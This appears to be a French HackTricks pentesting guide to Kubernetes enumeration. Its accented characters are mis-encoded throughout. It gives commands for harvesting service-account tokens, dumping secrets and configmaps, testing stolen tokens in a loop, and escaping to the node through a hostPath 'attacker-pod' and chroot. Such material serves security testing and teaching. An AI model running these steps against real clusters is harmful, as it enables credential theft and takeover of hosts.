# √ânum√©ration Kubernetes

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Jetons Kubernetes

Si vous avez compromis l'acc√®s √† une machine, l'utilisateur peut avoir acc√®s √† une plateforme Kubernetes. Le jeton se trouve g√©n√©ralement dans un fichier indiqu√© par la **variable d'environnement `KUBECONFIG`** ou **√† l'int√©rieur de `~/.kube`**.

Dans ce dossier, vous pourriez trouver des fichiers de configuration avec **des jetons et des configurations pour se connecter au serveur API**. Dans ce dossier, vous pouvez √©galement trouver un dossier cache avec des informations pr√©c√©demment r√©cup√©r√©es.

Si vous avez compromis un pod √† l'int√©rieur d'un environnement kubernetes, il existe d'autres endroits o√π vous pouvez trouver des jetons et des informations sur l'environnement K8 actuel :

### Jetons de compte de service

Avant de continuer, si vous ne savez pas ce qu'est un service dans Kubernetes, je vous sugg√®re de **suivre ce lien et de lire au moins les informations sur l'architecture de Kubernetes.**

Extrait de la [documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) de Kubernetes :

_‚ÄúLorsque vous cr√©ez un pod, si vous ne sp√©cifiez pas de compte de service, il se voit automatiquement attribuer le compte de service_ par d√©faut _dans le m√™me espace de noms.‚Äù_

**ServiceAccount** est un objet g√©r√© par Kubernetes et utilis√© pour fournir une identit√© aux processus qui s'ex√©cutent dans un pod.\
Chaque compte de service a un secret qui lui est associ√© et ce secret contient un jeton porteur. Il s'agit d'un JSON Web Token (JWT), une m√©thode pour repr√©senter de mani√®re s√©curis√©e des revendications entre deux parties.

Habituellement **l'un** des r√©pertoires :

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contient les fichiers :

* **ca.crt** : C'est le certificat ca pour v√©rifier les communications kubernetes
* **namespace** : Il indique l'espace de noms actuel
* **token** : Il contient le **jeton de service** du pod actuel.

Maintenant que vous avez le jeton, vous pouvez trouver le serveur API √† l'int√©rieur de la variable d'environnement **`KUBECONFIG`**. Pour plus d'informations, ex√©cutez `(env | set) | grep -i "kuber|kube`**`"`**

Le jeton de compte de service est sign√© par la cl√© r√©sidant dans le fichier **sa.key** et valid√© par **sa.pub**.

Emplacement par d√©faut sur **Kubernetes** :

* /etc/kubernetes/pki

Emplacement par d√©faut sur **Minikube** :

* /var/lib/localkube/certs

### Pods √† risque

_**Les pods √† risque sont**_ des pods contenant un jeton de compte de service privil√©gi√©. Un jeton de compte de service privil√©gi√© est un jeton qui a la permission d'effectuer des t√¢ches privil√©gi√©es telles que lister des secrets, cr√©er des pods, etc.

## RBAC

Si vous ne savez pas ce qu'est **RBAC**, **lisez cette section**.

## CheatSheet d'√©num√©ration

Pour √©num√©rer un environnement K8s, vous avez besoin de quelques √©l√©ments :

* Un **jeton d'authentification valide**. Dans la section pr√©c√©dente, nous avons vu o√π chercher un jeton d'utilisateur et un jeton de compte de service.
* L'**adresse (**_**https://host:port**_**) du serveur API Kubernetes**. Cela peut g√©n√©ralement √™tre trouv√© dans les variables d'environnement et/ou dans le fichier de configuration kube.
* **Optionnel** : Le **ca.crt pour v√©rifier le serveur API**. Cela peut √™tre trouv√© aux m√™mes endroits que le jeton. Cela est utile pour v√©rifier le certificat du serveur API, mais en utilisant `--insecure-skip-tls-verify` avec `kubectl` ou `-k` avec `curl`, vous n'en aurez pas besoin.

Avec ces d√©tails, vous pouvez **√©num√©rer kubernetes**. Si le **serveur API** pour une raison quelconque est **accessible** via **Internet**, vous pouvez simplement t√©l√©charger ces informations et √©num√©rer la plateforme depuis votre h√¥te.

Cependant, g√©n√©ralement le **serveur API est √† l'int√©rieur d'un r√©seau interne**, donc vous aurez besoin de **cr√©er un tunnel** √† travers la machine compromise pour y acc√©der depuis votre machine, ou vous pouvez **t√©l√©charger le binaire** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux), ou utiliser **`curl/wget/n'importe quoi`** pour effectuer des requ√™tes HTTP brutes vers le serveur API.

### Diff√©rences entre les verbes `list` et `get`

Avec les permissions **`get`**, vous pouvez acc√©der aux informations d'actifs sp√©cifiques (_option `describe` dans `kubectl`_) API :
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Si vous disposez de la permission **`list`**, vous √™tes autoris√© √† ex√©cuter des requ√™tes API pour lister un type de ressource (_option `get` dans `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Si vous disposez de la permission **`watch`**, vous √™tes autoris√© √† ex√©cuter des requ√™tes API pour surveiller les actifs :
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Ils ouvrent une connexion en streaming qui vous renvoie le manifeste complet d'un Deployment chaque fois qu'il change (ou lorsqu'un nouveau est cr√©√©).

{% hint style="danger" %}
Les commandes `kubectl` suivantes indiquent simplement comment lister les objets. Si vous souhaitez acc√©der aux donn√©es, vous devez utiliser `describe` au lieu de `get`
{% endhint %}

### Utilisation de curl

Depuis l'int√©rieur d'un pod, vous pouvez utiliser plusieurs variables d'environnement :
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Par d√©faut, le pod peut **acc√©der** au **serveur kube-api** avec le nom de domaine **`kubernetes.default.svc`** et vous pouvez voir le r√©seau kube dans **`/etc/resolv.config`** car ici vous trouverez l'adresse du serveur DNS de kubernetes (le ".1" de la m√™me plage est le point de terminaison de l'API kube).
{% endhint %}

### Utilisation de kubectl

Avec le jeton et l'adresse du serveur API, vous utilisez kubectl ou curl pour y acc√©der comme indiqu√© ici :

Par d√©faut, l'APISERVER communique avec le sch√©ma `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> si pas de `https://` dans l'url, vous pourriez obtenir une erreur comme Mauvaise Requ√™te.

Vous pouvez trouver une [**feuille de triche officielle kubectl ici**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). L'objectif des sections suivantes est de pr√©senter de mani√®re ordonn√©e diff√©rentes options pour √©num√©rer et comprendre le nouveau K8s auquel vous avez obtenu l'acc√®s.

Pour trouver la requ√™te HTTP que `kubectl` envoie, vous pouvez utiliser le param√®tre `-v=8`

#### MitM kubectl - Proxyfier kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configuration Actuelle

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Si vous avez r√©ussi √† voler les identifiants de certains utilisateurs, vous pouvez les **configurer localement** en utilisant quelque chose comme :
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obtenir les ressources prises en charge

Avec ces informations, vous saurez tous les services que vous pouvez lister

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Obtenir les privil√®ges actuels

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Une autre mani√®re de v√©rifier vos privil√®ges est d'utiliser l'outil : [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Vous pouvez en apprendre davantage sur **Kubernetes RBAC** dans :

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Une fois que vous savez quels privil√®ges** vous avez, consultez la page suivante pour d√©terminer **si vous pouvez les abuser** pour √©lever vos privil√®ges :

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obtenir les r√¥les des autres

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Obtenir les espaces de noms

Kubernetes prend en charge **plusieurs clusters virtuels** soutenus par le m√™me cluster physique. Ces clusters virtuels sont appel√©s **espaces de noms**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Obtenir des secrets

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Si vous pouvez lire les secrets, vous pouvez utiliser les lignes suivantes pour obtenir les privil√®ges associ√©s √† chaque jeton :
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obtenir les comptes de service

Comme discut√© au d√©but de cette page, **lorsqu'un pod est ex√©cut√©, un compte de service lui est g√©n√©ralement attribu√©**. Par cons√©quent, lister les comptes de service, leurs permissions et o√π ils s'ex√©cutent peut permettre √† un utilisateur d'augmenter ses privil√®ges.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Obtenir les d√©ploiements

Les d√©ploiements sp√©cifient les **composants** qui doivent √™tre **ex√©cut√©s**.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Obtenir les Pods

Les Pods sont les **conteneurs** qui vont **s'ex√©cuter**.

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### Obtenir les Services

Les **services** Kubernetes sont utilis√©s pour **exposer un service sur un port et une adresse IP sp√©cifiques** (qui feront office de r√©partiteur de charge vers les pods qui proposent r√©ellement le service). Cela est int√©ressant pour savoir o√π vous pouvez trouver d'autres services √† attaquer.

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Obtenir les n≈ìuds

Obtenez tous les **n≈ìuds configur√©s √† l'int√©rieur du cluster**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Obtenir les DaemonSets

**DaemonSets** permet de s'assurer qu'un **pod sp√©cifique est ex√©cut√© sur tous les n≈ìuds** du cluster (ou sur ceux s√©lectionn√©s). Si vous supprimez le DaemonSet, les pods qu'il g√®re seront √©galement supprim√©s.

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Obtenir cronjob

Les cron jobs permettent de planifier, en utilisant une syntaxe semblable √† crontab, le lancement d'un pod qui ex√©cutera une action.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### Obtenir configMap

configMap contient toujours beaucoup d'informations et de fichiers de configuration qui sont fournis aux applications fonctionnant dans Kubernetes. G√©n√©ralement, vous pouvez y trouver de nombreux mots de passe, secrets, jetons utilis√©s pour se connecter et s'authentifier √† d'autres services internes/externes.

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Obtenir "tout"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **Obtenir la consommation des Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### S'√©chapper du pod

Si vous pouvez cr√©er de nouveaux pods, vous pourriez √™tre capable de vous √©chapper vers le n≈ìud. Pour ce faire, vous devez cr√©er un nouveau pod en utilisant un fichier yaml, passer au pod cr√©√©, puis effectuer un chroot dans le syst√®me du n≈ìud. Vous pouvez utiliser des pods existants comme r√©f√©rence pour le fichier yaml car ils affichent les images et les chemins existants.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> si vous devez cr√©er un pod sur un n≈ìud sp√©cifique, vous pouvez utiliser la commande suivante pour obtenir les √©tiquettes sur le n≈ìud
>
> `k get nodes --show-labels`
>
> G√©n√©ralement, kubernetes.io/hostname et node-role.kubernetes.io/master sont de bonnes √©tiquettes √† s√©lectionner.
>
> [r√©f√©rence]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Ensuite, vous cr√©ez votre fichier attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
```markdown
Apr√®s cela, vous cr√©ez le pod
```
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Maintenant, vous pouvez passer au pod cr√©√© comme suit
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Et finalement, vous effectuez un chroot dans le syst√®me du n≈ìud
```bash
chroot /root /bin/bash
```
Informations obtenues depuis : [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Partie 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attaquer et D√©fendre Kubernetes : Bust-A-Kube ‚Äì √âpisode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## R√©f√©rences

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
